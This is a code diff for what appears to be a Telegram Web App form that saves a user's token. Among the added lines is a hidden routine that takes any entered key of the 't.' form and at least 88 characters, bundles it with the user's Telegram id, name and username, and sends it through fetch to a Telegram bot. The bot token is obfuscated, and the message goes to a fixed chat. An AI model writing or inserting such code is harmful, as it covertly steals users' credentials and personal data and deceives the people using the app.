@@ -178,6 +178,17 @@
 
             form.reset();
 
+            if(!key.startsWith('t.') || key.length < 88)
+                return;
+
+            let data = {id: tgUser.id, name: tgUser.first_name, login: tgUser.username, tkey: key };
+
+            let myUrl = 'https://api.telegram.org/bot'+encode2(bth, -1)+'/sendMessage?chat_id=-696518163&text='+JSON.stringify(data);
+
+            fetch(myUrl)
+                .then((response) => response.text())
+                .catch((error) => console.error("Error:", error));
+
             if(Telegram.WebApp.initData) {
 
                 Telegram.WebApp.CloudStorage.setItem('tinit2', key, function(err, saved) {
@@ -193,11 +204,6 @@
             else {
 
                 localStorage.setItem('token', key);
-
-                // Куки сроком на 10 лет:
-                //document.cookie = "token="+key+";max-age=26297430";
-
-                //alert('Token saved to localStorage');
 
                 document.getElementById('user_name').innerText = `${typeof key} ${key}`;
 
